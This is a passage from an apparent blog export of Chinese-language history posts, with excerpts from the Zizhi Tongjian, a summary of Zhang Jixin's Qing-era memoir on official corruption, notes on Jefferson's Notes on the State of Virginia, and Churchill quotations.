    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h4 id="《资治通鉴·唐纪二十三·卷第二百七》"><a href="#《资治通鉴·唐纪二十三·卷第二百七》" class="headerlink" title="《资治通鉴·唐纪二十三·卷第二百七》"></a>《资治通鉴·唐纪二十三·卷第二百七》</h4><p>太后信重内史梁文惠公狄仁杰，群臣莫及，常谓之国老而不名。<br>太后尝问仁杰：“朕欲得一佳士用之，谁可者？”<br>仁杰曰：“未审陛下欲何所用之?”<br>太后曰：“欲用为将相。”<br>仁杰对曰：“文学蕴藉，则苏味道、李峤固其选矣。必欲取其卓荦奇才，则有荆州长史张柬之，其人虽老，宰相才也。”<br>太后擢张柬之为洛州司马。<br>数日，又问仁杰，对曰：“前荐柬之，尚未用也。”<br>太后曰：“已迁矣。”<br>对曰：“臣所荐者可为宰相，非司马也。” 乃迁秋官侍郎；久之，卒用为相。</p>
<p>仁杰又尝荐夏官侍郎姚元崇、监察御史曲阿桓彦范、太州刺史敬晖等数十人，率为名臣。<br>或谓仁杰曰：“天下桃李，悉在公门矣。”<br>仁杰曰：“荐贤为国，非为私也。”</p>
<h4 id="《神探狄仁杰》台词鉴赏"><a href="#《神探狄仁杰》台词鉴赏" class="headerlink" title="《神探狄仁杰》台词鉴赏"></a>《神探狄仁杰》台词鉴赏</h4><h4 id="《神探狄仁杰》·-第一部-·-幽州案"><a href="#《神探狄仁杰》·-第一部-·-幽州案" class="headerlink" title="《神探狄仁杰》· 第一部 · 幽州案"></a>《神探狄仁杰》· 第一部 · 幽州案</h4><blockquote>
<p>自三皇治世、五帝分伦，帝者，以牧养生民为社稷，当体上天好生之德，循加万物；君明则臣举，朝野同心矣。幽州者，朝之上州，内治生民而外御诸夷，无能轻觑，吏治尤为重焉。</p>
</blockquote>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>History</tag>
      </tags>
  </entry>
  <entry>
    <title>唐史 | History of Empire</title>
    <url>/2018/01/07/History-Tang/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="重要文献"><a href="#重要文献" class="headerlink" title="重要文献"></a>重要文献</h2><ul>
<li><p><a href="https://zh.wikisource.org/zh/%E5%A4%A7%E5%94%90%E5%89%B5%E6%A5%AD%E8%B5%B7%E5%B1%85%E6%B3%A8" target="_blank" rel="noopener">《大唐创业起居注》</a></p>
</li>
<li><p>《大唐三藏法师西域记》</p>
</li>
</ul>
<h2 id="《资治通鉴》摘要"><a href="#《资治通鉴》摘要" class="headerlink" title="《资治通鉴》摘要"></a>《资治通鉴》摘要</h2><h4 id="《资治通鉴·唐纪八·卷第一百九十二》"><a href="#《资治通鉴·唐纪八·卷第一百九十二》" class="headerlink" title="《资治通鉴·唐纪八·卷第一百九十二》"></a>《资治通鉴·唐纪八·卷第一百九十二》</h4><p>益州大都督窦轨奏称獠反，请发兵讨之。<br>上曰：“獠依阻山林，时出鼠窃，乃其常俗；<br>牧守苟能抚以恩信，自然帅服，安可轻动干戈，渔猎其民，比之禽兽，岂为民父母之意邪！”</p>
<h4 id="《资治通鉴·唐纪二十三·卷第二百七》"><a href="#《资治通鉴·唐纪二十三·卷第二百七》" class="headerlink" title="《资治通鉴·唐纪二十三·卷第二百七》"></a>《资治通鉴·唐纪二十三·卷第二百七》</h4><p>太后信重内史梁文惠公狄仁杰，群臣莫及，常谓之国老而不名。<br>太后尝问仁杰：“朕欲得一佳士用之，谁可者？”<br>仁杰曰：“未审陛下欲何所用之?”<br>太后曰：“欲用为将相。”<br>仁杰对曰：“文学蕴藉，则苏味道、李峤固其选矣。必欲取其卓荦奇才，则有荆州长史张柬之，其人虽老，宰相才也。”太后擢张柬之为洛州司马。<br>数日，又问仁杰，对曰：“前荐柬之，尚未用也。”<br>太后曰：“已迁矣。”<br>对曰：“臣所荐者可为宰相，非司马也。” 乃迁秋官侍郎；久之，卒用为相。</p>
<p>仁杰又尝荐夏官侍郎姚元崇、监察御史曲阿桓彦范、太州刺史敬晖等数十人，率为名臣。<br>或谓仁杰曰：“天下桃李，悉在公门矣。”<br>仁杰曰：“荐贤为国，非为私也。”</p>
<h4 id="《资治通鉴·-·唐纪二十三·卷第二百七》"><a href="#《资治通鉴·-·唐纪二十三·卷第二百七》" class="headerlink" title="《资治通鉴· ·唐纪二十三·卷第二百七》"></a>《资治通鉴· ·唐纪二十三·卷第二百七》</h4><p>秋，七月，丙戌，以神都副留守杨再思为内史。<br>再思为相，专以谄媚取容。司礼少卿张同休，易之之兄也，尝召公卿宴集，酒酣，戏再思曰：“杨再思面似高丽。” 再思欣然，即剪纸帖巾，反批紫袍，为高丽舞，举坐大笑。<br>时人或誉张宗昌之美曰：“六郎面似莲花。”<br>再思独曰：“不然。”<br>昌宗问其故，再思曰：“乃莲花似六郎耳。”</p>
<p>“左补阙戴令言作《两脚野狐赋》以讥讽之，再思闻之怒。”<br>—— 《旧唐书·杨再思传》</p>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>History</tag>
      </tags>
  </entry>
  <entry>
    <title>私人历史文献：张集馨《时晴斋主人自叙年谱》</title>
    <url>/2017/10/22/History-Qing-ZhangJiXing/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>吏治：贿赂公行，政由贿出</li>
<li>刑狱：上下交通，枉法裁判</li>
<li>财政：巧立名目，巧取豪夺</li>
<li>军队：营制败坏，军纪荡然</li>
<li>背景：张集馨的个人生活</li>
<li>附录：张集馨的生平年表</li>
</ul>
<p>中华书局1981年编辑出版 <strong>《道咸宦海见闻录》</strong>，作者：张集馨，（1800年－1879年），字椒云，别号时晴斋主人，江苏仪征人。道光咸丰年间历任翰林院、太原知府、道员，福建、陕甘、四川、河南、直隶、江西等省按察使、布政使、署理巡抚等职。</p>
<a id="more"></a>
<p>不同于一般大官僚自订或后人编述的年谱，多是连篇累牍自我吹嘘和阿谀谄媚之辞，该年谱主要为其任职其间所经历的官场人事浮沉、立以敏锐观察及看法之记录，记述详实但观点从己身出。张集馨翰林出身，擅长文墨、观察敏锐，其所处的时代正是清朝遭受内忧外患冲击至大之大动荡前期，张任职范围覆盖大江南北，更以一介文士多次出入幕府、统兵作战，阅历丰富，而且再加上几起几落，对于当时的政情吏治、世风民情，有较为清醒的认识。正如一个不具名的传抄者曾说：“这部书名为年谱，其实几乎等同于小说，对官场鬼蜮情形，刻画入微，不亚于清末之《官场现形记》、《二十年目睹之怪现状》”。</p>
<h2 id="一、吏治：贿赂公行，政由贿出"><a href="#一、吏治：贿赂公行，政由贿出" class="headerlink" title="一、吏治：贿赂公行，政由贿出"></a>一、吏治：贿赂公行，政由贿出</h2><p>道光二十二年，张时任福建汀漳龙道。 “郡城倡楼赌馆，每月送道署费三百金，公严拒、惩办。”</p>
<p>“将军三节两寿，粮道每次送银八百两，又表礼、水礼八色，门包四十两一次。两都统每节送银二百两，水礼四色。八旗协领八员，每节每员送银二十两，上白米四石。抚台分四季致送，每季一千三百两，节寿但送表礼、水礼、门包杂费。制台按三节致送，每节一千两，表礼、水礼八色及门包杂费，差家人赴兰州呈送。” 众多官僚的生活正所谓：“大宴会则无月无之，小应酬则无日无之。终日送往迎来，听戏宴会，几于无日不花天酒地。”</p>
<p>闽浙总督颜伯焘，革职后回广东原籍，途径漳州，随带物品之多，排场之大，骇人听闻。扛夫搬运箱笼什物过境，每日多至六七百名，一连十天才过完。“差役、抬夫、家属马仆从几三千名，酒席上下共用四百余桌，一住五天，实用去一万余金。”</p>
<p>直隶总督桂良（恭亲王岳丈，满洲正红旗，官至直隶总督、兵部尚书、文华殿大学士、军机大臣），“其胸中蕴蓄如草芥，其口中吐属如市井”，“椒戚贵族，气势熏灼”，卖缺受贿，无所顾忌。一名官员向张集馨诉苦说：“如卑职之候补苦员，亦敬送五百金，否则此官不能做矣。” 汴姓官僚向桂良行贿，得署冀州知州，“每节尚以千金为馈，是以署事几及年余，未曾更动。”</p>
<h4 id="宰相门房七品官"><a href="#宰相门房七品官" class="headerlink" title="宰相门房七品官"></a>宰相门房七品官</h4><p>总督庆正轩，更是包庇乃至鼓励门房收红包。“庆督又以为属员多送门包，才是看得起主人，是以若辈益无忌惮。镇协参游，亦须呈送，武官有何道理，不过摊诸兵饷。文职如两司有骨气者，都抚断不敢欺侮。武职体制卑微，虽镇协亦必巴结都署家人，甚有拜弟兄结干亲者。” 中高级军官尚且如此，何况兵士乎！</p>
<h2 id="二、刑狱：上下交通，枉法裁判"><a href="#二、刑狱：上下交通，枉法裁判" class="headerlink" title="二、刑狱：上下交通，枉法裁判"></a>二、刑狱：上下交通，枉法裁判</h2><p>道光二十八年，张时任四川按察使。<br>“各州县私立卡房，私系未定案人犯，并及无辜。” “大县卡房恒羁禁数百人，小邑亦不下数十人……户婚、田土、钱债、佃故被证人等，亦拘禁其中。每日给稀糜一瓯，终日不见天日……通省毙者，每年不下一二千人。”<br>”遂宁陈令，规避盗案处分，强以并无奸夫之十八岁幼妇为谋死亲夫，又以十七岁幼女为谋杀胞兄加功。”<br>“盐商王姓子与同学幼童调奸不从，将幼童杀毙，移尸于门外潭中。王商贿通书役摇惑问官。”<br>“仁寿县武生王骡子，夜率众抢劫范氏家，强奸其媳。署县某删去抢掠情节，改强为和。范氏上控。公提讯得实，问如律。”</p>
<p>更有甚者，各省司法衙门每年报送案件之时还需向北京刑部行贿，名之曰”秋审部费”。“四川秋审部费，向例给以六百金，部书于五六月间专人将秋审实缓底折送署，收取部费，司中不与交通，皆在省佐杂，有部办出身者网罗其事，彼即于中取利。”</p>
<h2 id="三、财政：巧立名目，巧取豪夺"><a href="#三、财政：巧立名目，巧取豪夺" class="headerlink" title="三、财政：巧立名目，巧取豪夺"></a>三、财政：巧立名目，巧取豪夺</h2><p>道光二十八年，张时任四川按察使，八月署理布政使。<br>“藩库闲款向为官吏侵蚀，分销册籍。公承办清查，于都署及通省文武衙门搜查旧案，派员勾稽，究出侵挪二万余两，追还司库。”</p>
<h4 id="大清房产税"><a href="#大清房产税" class="headerlink" title="大清房产税"></a>大清房产税</h4><p>“四川民情浮动，买卖地亩，几同儿戏，每有朝为售主，夕作买户者。地方官沾润税契银两，以肥身家，数日无契请印，州县提粮差追比，是以 <strong>茶坊酒肆，每讲论田土，差役必从中百计怂恿，甚而讲论未定，差役即报官勒税，稍涉争辩，即押入卡房</strong>，其风由来久矣。”</p>
<h4 id="钓鱼执法"><a href="#钓鱼执法" class="headerlink" title="钓鱼执法"></a>钓鱼执法</h4><p>“官将去任，减价勒税，名曰：放炮。繁剧地方，放炮一次，可得万金，或五七金不等。<br>官累重者，日放谣言，云将去任，减价催税；差役又遍乡里传知，百姓贪图小利，纷纷投税。其实并无去任之说，名为太平炮。<br>又有新官甫经到任，亦减价催税，名曰：倒炮。”</p>
<h2 id="四、军队：营制败坏，军纪荡然"><a href="#四、军队：营制败坏，军纪荡然" class="headerlink" title="四、军队：营制败坏，军纪荡然"></a>四、军队：营制败坏，军纪荡然</h2><p>道光十八年，张时任太原知府。<br>“太原巨盗根寅儿抢劫典铺，与满城骁骑校长庆等皆窝贼分赃。根寅儿既捕获，复杀捕逃逸。公严缉获案，戮三人，军七人，驻防兵始畏法。”</p>
<p>道光十九年，张署雁平道。<br>“绥远城防御哈楚暹，因略买民女为妾，其长官操之急，哈遂京控参佐各官赃私各款，并牵及将军、副都统徇隐，以为抵制计。奉旨：交巡抚杨国桢查办。”</p>
<p>同治二年，张署理陕西巡抚。<br>“陕省西至长武东至潼关一千余里之遥，并无一兵，…… 各营例饷，只能二成。”<br>“陕南兴义、汉中二镇、商州一协，有营无兵。汉中镇额设马步七千余人，今乃并无一人。看城门者系营中现雇，日给百文，否则亦无人受雇。榆林一镇，兵如乞丐，军械早已变卖糊口，闻调遣则现雇闲人，无非希图口粮，及临敌则狂奔而已。抚标三营城守二营，共额兵三千余员名，今所存者不及十分之一，乃系老病不堪，别无营趁，稍壮实者，或小本贸易，或受雇为勇。”</p>
<p>张曾先后任福建汀漳龙道台，署理福建布政使。对福建驻军腐烂情况深有体会，他认为“营制之坏，闽省极矣”：“闽省风俗，强凌弱，众暴寡，村居里处，每每被人蹂躏。若挂名营伍，门悬挂某营旗灯，凶徒便不敢滋扰……然欲入营，必先贿属，或十余元，或数十元，视家道之贫富，定数目之多寡，千、把、都、守，不能独得，将、官、提、镇，亦复分肥。……每遇征调，立时雇人，而街上乞丐流民，散遣废勇，替名顶充。既可分俸赏行装银两，每日复有应得口粮。沿途滋扰，需索逞凶，种种不法，地方畏其人众，奚敢谁何。带队千、把、都、守，各人需索，统带镇、协、参、游，亦有酒席供亿，己身不正，安能正人？且所带各兵，皆系当时招募，乌合闲人，不知纪律，营员亦不敢绳之以法，恐其哗散，及至临敌，见贼先奔。”</p>
<p>太平天国时期，张曾出入江南大营幕府：“各兵勇与本地居民皆为婚姻，生有子女，各怀家室之念，其无家者，雇土娼入帐轮奸，后以妒争事，闻于向帅，立斩数人，又将被雇土娼，枭示营外；乃恬不畏法，昼则在田佯为工作，夜则入街进帐，奸宿如常。贼有固志，兵无斗心，克复金陵，恐非可期于旦夕”。</p>
<h2 id="五、背景：张集馨的个人生活"><a href="#五、背景：张集馨的个人生活" class="headerlink" title="五、背景：张集馨的个人生活"></a>五、背景：张集馨的个人生活</h2><p>年谱中也记录了张集馨大量的生活细节，例如：</p>
<p>“立王氏为正室。侍余已十六年，爱兰儿（长子）如己出，抚诸婢妾尚不苛刻。家无内政，不能统属，故立之。”</p>
<p>“黄夫人去世已十年，宿草空庭，能无悲戚。… 余时供职词馆（翰林院），禄入常不给，今幸稍丰，而夫人已埋香黄土，缘浅福薄，恨不向月下老人而详询之。”</p>
<h4 id="六、附录：张集馨生平年表"><a href="#六、附录：张集馨生平年表" class="headerlink" title="六、附录：张集馨生平年表"></a>六、附录：张集馨生平年表</h4><p>嘉庆五年（1800年）三月二十九日辰时生，于江苏仪征小市口。<br>嘉庆十二年 生母吴太夫人去世 。8岁<br>嘉庆十四年 继母许太夫人来归。10岁<br>嘉庆十六年 见痘症。12岁<br>嘉庆十九年 初应童试，府县皆首列，以病未能与院试。15岁<br>嘉庆二十三年 继母许太夫人卒。19岁<br>嘉庆二十五年 生父卒。21岁<br>道光二年（1822年）中第一百三十七名举人。23岁<br>道光三年（1823年）三月应礼部试，荐而未售。<br>                五月考取景山官学教习。<br>                六月移居座师<a href="https://zh.wikipedia.org/wiki/%E6%81%A9%E9%8A%98_(%E5%98%89%E6%85%B6%E9%80%B2%E5%A3%AB" target="_blank" rel="noopener">恩铭</a>)家，授诸公子读。恩铭（1786年－1840年），董鄂氏，字兰士。满洲正红旗。嘉庆十三年进士，历任内阁学士、侍卫、大理寺卿，刑部、礼部尚书、左都御史、正黄旗汉军都统。<br>                九月，从学士钱金粟先生林阅课艺。<br>道光六年 四月，春闱落第，返里<br>道光七年 三月，娶元配黄夫人。28岁<br>道光九年 三月应礼部试，中第一百五十八名贡士。殿试二甲。朝考入选，钦点翰林院庶吉士。<br>道光九年（1829年）乙丑科进士，翰林院庶吉士。30岁<br>道光十年（1830年）十月充武英殿协修。31岁<br>道光十二年（1832年）四月散馆一等授编修，七月充武英殿篡修。<br>道光十六年（1836年）五月保送御史记名，补 <strong>授山西朔平府知府</strong> ，九月抵任，赈灾治蝗。37岁<br>道光十七年（1837年）倡议创立玉林书院。<br>道光十八年（1838年）七月调署山西太原府。治理刑狱。38岁<br>道光十九年（1839年）三月回朔平任。四月署山西雁平道(代县)。<br>道光二十一年（1841年）三月补 <strong>授福建汀漳龙道</strong> 。<br>道光二十三年 长子生。44岁<br>道光二十四年（1844年）九月服满，入京候缺。<br>道光二十五年（1845年）正月补 <strong>授陕西督粮道</strong> 。45岁<br>                   因旱荒向陕西巡抚林则徐(1785-1850)请示缓征，得林赏识。<br>道光二十七年（1847年）六月补 <strong>授四川按察使</strong> 。<br>道光二十九年（1849年）七月补授贵州布政使。<br>道光三十年（1850年）调补 <strong>河南布政使</strong>。<br>咸丰元年（1851年），二月召对八次。六月总督琦善因案被劾，张受累，<strong>遣戍军台</strong>。51岁。时任总督（署理）：萨阿迎<br>咸丰二年（1852年）五月含冤到戍，十一月就庶籍，赏四品顶戴，补授河南按察使。<br>                十二月入京，召对二次。尚未出京又调补湖北按察使。<br>咸丰三年（1853年）二月补授直隶布政使，带兵防守。<br>目睹直隶总督桂良与其孙麟趾卖缺受贿。因受钦差大臣胜保调遣办理军务而被桂良迁怒，参劾其“不听调度，滥用帑金”，遭革职遣戍。因军务留营免遣。<br>咸丰五年（1855年）四月因军功赏五品顶戴。九月发往荣军营听后差遣。<br>咸丰六年（1856年）二月抵江南大营，病假回籍就医。八月回京，九月赏四品顶戴，署甘肃布政使，召对五次。<br>咸丰七年（1857年）二月抵甘肃就任。设立捐局为藩库理财。<br>咸丰八年（1858年）总督乐斌令出师河州剿回，张派员调停搞定。四月丁忧回籍，十月入京。<br>咸丰九年（1859年）五月服满，召对一次。九月加三品顶戴，署福建布政使，召对二次。<br>咸丰十年（1860年）正月抵任（福建布政使），整顿盐茶厘金。六月调补江西布政使。<br>                以兵燹、久雨、歉收等原因求总督曾国藩缓征丁粮，被奏革职。<br>同治二年（1863年）正月补授陕西布政使，召对一次。三月抵任，署陕西巡抚。<br>               麦熟时节，原巡抚瑛棨怕回不肯出城收小麦，张督兵收割并剿回。刘蓉调任巡抚。总督熙麟。<br>同治三年（1864年）三月回原任，九月赴甘肃查办旧案，兵剿固原。64岁<br>同治四年（1865年）正月被参革职，永不叙用。65岁（因陕西巡抚刘蓉查前总督熙麟、京堂李云麟等案）<br>                后因军功撤销永不叙用处分。八月病休回京。<br>同治九年（1870年）主讲金台书院，培养诸多学生。70岁<br>              同治十三年（1874年）甲戌科状元陆润庠<br>              光绪二年（1876年）丙子恩科榜眼王赓荣、探花冯文蔚、传胪（二甲第一名）吴树梅<br>              光绪三年（1877年）丁丑科状元王仁堪、探花朱赓飏。<br>光绪四年十二月十一日（1879年1月3日）北京去世。79岁</p>
]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
        <tag>讲武堂</tag>
      </tags>
  </entry>
  <entry>
    <title>私人历史文献：弗吉尼亚笔记</title>
    <url>/2017/11/05/History-USA-Virginia/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>托马斯·杰斐逊</li>
<li>写作背景<a id="more"></a>
</li>
</ul>
<h2 id="作者：托马斯·杰斐逊"><a href="#作者：托马斯·杰斐逊" class="headerlink" title="作者：托马斯·杰斐逊"></a>作者：托马斯·杰斐逊</h2><p>托马斯·杰斐逊（Thomas Jefferson，1743年4月13日－1826年7月4日），美利坚合众国总统（1801年─1809年），《美国独立宣言》主要起草人，及美国开国元勋中最具影响力者之一。</p>
<p>杰斐逊秉持古典自由主义与共和主义（republicanism），制定弗吉尼亚宗教自由法（Virginia Statute for Religious Freedom, 1779, 1786），该法日后成为美国宪法第一修正案的条文基础。杰斐逊同时也是弗吉尼亚大学（University of Virginia，UVA）的创办人，农学、园艺学、建筑学、词源学、考古学、数学、密码学、测量学与古生物学等学科的专家，身兼作家、律师与小提琴手。</p>
<p>杰斐逊 1792 年创立并领导民主共和党（民主党之前身），杰斐逊曾为第二任弗吉尼亚州州长（1779年－1781年）、第一任美国国务卿（1789年─1793年）、与第二任美国副总统（1797年－1801年）。1800年杰弗逊击败竞逐连任的亚当斯当选美国第三任总统。总统任期中之重大事件：</p>
<ul>
<li>路易斯安那购地案（1803年）</li>
<li>1807年禁运法案（Embargo Act of 1807）</li>
<li>路易斯与克拉克探勘（1804–1806）</li>
</ul>
<h2 id="写作背景"><a href="#写作背景" class="headerlink" title="写作背景"></a>写作背景</h2><p>《弗吉尼亚笔记》是托马斯·杰斐逊唯一的一个长篇专著，写这本书主要是为了回答当时驻费城的法国公使巴尔·马布瓦侯爵向他提出的一些问题。当时杰斐逊刚卸任弗吉尼亚州州长职务，在一次骑马中坠马受伤，正在养伤期间。1782-1783 年冬作了修改和补充，但由于出版费用过高并未立即在美国出版，1784 年杰斐逊在法国自费匿名出版（初版印刷 200 册，标注出版日期为 1782 年），在之后陆续在法国、英国、德国和美国出版。</p>
<h2 id="全书结构"><a href="#全书结构" class="headerlink" title="全书结构"></a>全书结构</h2><p>《弗吉尼亚笔记》主要部分包括：</p>
<ol>
<li>回答弗吉尼亚州的幅员边界问题</li>
<li>地理环境、自然资源和开发</li>
<li>社会、法律、宗教、经济、军事和历史问题</li>
</ol>
<h4 id="地理"><a href="#地理" class="headerlink" title="地理"></a>地理</h4><ul>
<li>问题十二：请介绍一下县、市、镇和村好吗？<br>在问题九已列举了所有的县。它们一共有 74 个，大小不一，人口也极不平均。其中 35 个在东部地区，或者在那根平行线上，23 个在中部地区，介于东部地区和蓝岭山脉之间；8 个在蓝岭和阿勒格尼山之间，8 个在阿勒格尼山以西。</li>
</ul>
<p>本州也按照另一种划分分成教区，其中许多教区和县等同，但往往一个县有不止一个教区，一个教区有不止一个县。这种划分与州的宗教有关，迄今为止，每个教区都建立了英国国教会，领取固定薪金。划分教区的另外一个目的是照顾穷人。（P53）</p>
<h4 id="评价华盛顿和富兰克林"><a href="#评价华盛顿和富兰克林" class="headerlink" title="评价华盛顿和富兰克林"></a>评价华盛顿和富兰克林</h4><p>在战争中我们出了一个华盛顿，只要自由拥有信徒，他就永远为人们所怀念和崇敬，他的英名将永垂不朽，在未来世界最杰出人物中占有应有的位置，而那时那种把他归入自然退化者之列的可恶的哲学却已被人们遗忘了。（P37）</p>
<p>在物理学方面，我们出了一个富兰克林，当代没有一个人比他有更多的重大发明，没有一个人比他更多地充实和加深了哲学，或者对自然现象作出更富有创造性的解释。（P37）</p>
<h4 id="经济"><a href="#经济" class="headerlink" title="经济"></a>经济</h4><ul>
<li><p>奴隶<br><strong>男女奴隶被关在隔离的房子里，因为对奴隶主来说，抚养一个孩子要比买一个奴隶花费更大。（P91）</strong></p>
</li>
<li><p>问题十一：请谈谈定居在该州的印第安人的情况好吗？（P45）</p>
</li>
</ul>
<h4 id="法律原则"><a href="#法律原则" class="headerlink" title="法律原则"></a>法律原则</h4><p>当我们在为我们自己的法律进行辩论时，我们曾立下一个基本原则：法律要做到公正，就必须给双方对等的权利，不然法律就仅仅是些专横的行为准则，建立在暴力而不是良心之上。（P93）</p>
<h4 id="政治体制"><a href="#政治体制" class="headerlink" title="政治体制"></a>政治体制</h4><ul>
<li>问题十三：州宪法及其特许状呢？</li>
</ul>
<p>我们的政府体制大致如下：行政权掌握在州长手中。州长每年改选一次，七年内不得任职三年以上。他由一个有八名成员的参议会协助。司法权由若干法院分掌，下文将加以说明。立法权由议会两院行使，其中一个院叫众议院，由每个县各派两名议员组成，议员每年由公民选出，凡终身拥有 100 英亩无人居住或 25 英亩有人居住的土地，或者在某一个市镇上拥有一所房屋或一块地皮的公民，都拥有选举权；另一个院叫参议院，由 24 名成员组成，每四年由同一些选民改选一次，选民为此目的分成 24 个选区。一项法律要通过必须获得两院同意。州长及其参议会、最高法院法官、审计员、检察总长、司库、土地登记员以及国会代表均由两院任命。</p>
<p>政府的全部立法权、行政权和司法权都归结到立法机关。<strong>把这些权力集中在同一些人手里正是专制统治的真谛</strong>。这些权力由多数人行使而不是由单独一个人行使并不能使情况有所好转。173 个暴君肯定和一个暴君一样地富于压迫性。那些怀疑这一点的人只要看看威尼斯共和国就行了。议员是我们自己选举的对我们也没有什么帮助。<strong>选举产生的专制政府并不是我们所争取的政府，我们争取的政府不仅仅要建立在自由原则上 ，而且政府的各项权力必须平均分配给几个政府部门，每个政府部门都由其他部门有效地遏制和限制，无法超越其合法范围。</strong> 由于这个原因，通过政府条例的那个代表大会把政府建立在这样一个基础上，即立法、行政和司法三个部门应当分立，任何人在同一个时候不得行使一种以上的权力。（P65）</p>
<p>人们很快就学会行使他们所拥有或窃取的每一种权利和权力来满足他们的个人利益。</p>
<p>凯撒说过，有了钱就有人，有了人就有钱。</p>
<p>防止腐败和暴政的时机是在它们抓住我们之前。把狼拒之于羊栏门外，要比狼进了羊栏再去拔它的牙和爪为好。</p>
<p>一个领袖可以提出意见，但是不可以把他自己的意见强加于人，更不能让人们伸出脖子任他宰割，或者听任他作威作福而大气也不出。引起这些可怕的后果的头等大事至少应该是明显的和不可抗拒的。（P75）</p>
<p>他们从罗马历史中寻找先例，只有在罗马历史中找得到，也只有在罗马历史中证明它是致命的。他们从一个被最剧烈的内讧和骚乱所撕裂的共和国里找到了先例，<strong>在这个共和国里，政府是一个残酷无情的贵族政府，他们统治下的人民被贫困和悲惨生活变得不顾死活，在最艰难的环境里，除非靠一个暴君的无所不能的手，无法使骚乱平息。正因为如此，他们的宪法允许拥立一个临时的暴君，称之为执政官，那个临时的暴君，七变八变，变成终身任职了。</strong> （P76）</p>
<p>立法机关一旦攫取了权力，又有规定自己法定人数的权力，就可以把那个法定人数减少到一人，他们可以管这个人叫主席、议长、独裁者或者爱叫什么就叫什么。我们的情况的确很危险，希望同胞们明察，在适当的时候才去适当的补救办法。（P77）</p>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h4 id="军事史"><a href="#军事史" class="headerlink" title="军事史"></a>军事史</h4><ul>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-CN/" target="_blank" rel="noopener">中国军事史 | Military History of China</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">美国军事史 | Military History of United States</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/" target="_blank" rel="noopener">太平天国史</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">私人历史文献 | 弗吉尼亚笔记</a></li>
<li><a href="https://riboseyim.github.io/2017/10/22/History-Qing-ZhangJiXing/" target="_blank" rel="noopener">私人历史文献 | 时晴斋主人自叙年谱</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/" target="_blank" rel="noopener">黄仁宇:《明代的漕运》</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>政治历史</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>人物:温斯顿·丘吉尔</title>
    <url>/2019/04/07/History-Winston-Churchill/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>历史会善待我的，因为我打算书写历史。—— 温斯顿·S·丘吉尔</p>
</blockquote>
<a id="more"></a>
<h2 id="自传"><a href="#自传" class="headerlink" title="自传"></a>自传</h2><p>不管别人如何干扰，如何制造事端，最优秀的将领总是能达到预期的木笔而不会受制于作战计划。（温斯顿·S·丘吉尔《丘吉尔传·我的青春》p227）</p>
<p>写作可以成为你的一个伴侣，能在你的周围筑起一个看不见摸不着的水晶空间，你就像鱼缸里的一条金鱼，不过这个鱼缸是金鱼自己造出来的。写作一直陪伴着我，旅途中也没有片刻停下来，所以我从未感到无所事事。不是玻璃需要磨光，就是结构需要调整，要不就是缸体需要加固。（温斯顿·S·丘吉尔《丘吉尔传·我的青春》p227）</p>
<p>喝威士忌酒在当时时尚的英国也是一个新生事物。比如我的父亲，除了在荒野打猎时或某个非常阴冷的地方，他从来不喝威士忌。他生活在“白兰地加苏打水”的年代，事实上，白兰地加苏打水在当时是很体面高雅的瘾品。（温斯顿·S·丘吉尔《丘吉尔传·我的青春》p138）</p>
<p>我们这些年轻军官多么羡慕资深的少校在阿布科里战役中冒险的经历啊！我们又是多么羡慕上校获得的一长排荣誉勋章啊！他们不止一次给我们讲述他们以前激动人心的经历，我们百听不厌。我们多么希望也能有类似的记忆匣子，如果需要的话，可以向一群意气相投的观众一遍一遍地打开陈列。（温斯顿·S·丘吉尔《丘吉尔传·我的青春》p81）</p>
<p>在印度边境打仗本身就是一种难得的经理。……当地的帕坦人总是战事不断，不是各种私人间的争斗，就是公共的战争。除了收获的季节，因为生存的需要，他们才会暂时休战。在这里，每个人既是勇士，又是政治家和神学家。每一幢大的房子都是一个堡垒……每个村子都有自己的防御工事，每个家庭都有自己的家族世仇，每个宗族也都有自己的世仇，数不清的部落和各种各样的部落联合体相互之间都有许多仇恨的账需要清算；没有什么是可以遗忘的，每一笔账都要算清楚。（温斯顿·S·丘吉尔《丘吉尔传·我的青春》p147）</p>
<h2 id="评价"><a href="#评价" class="headerlink" title="评价"></a>评价</h2><p>以赛亚·伯林认为丘吉尔核心的思想原则是历史想象力——可以把全部当下和全部未来都装进丰富多彩的过去的框架中，丘吉尔最强大的感受能力是对过去的感受。特别是对古代史的感受使他熟知人性的黑暗。</p>
<blockquote>
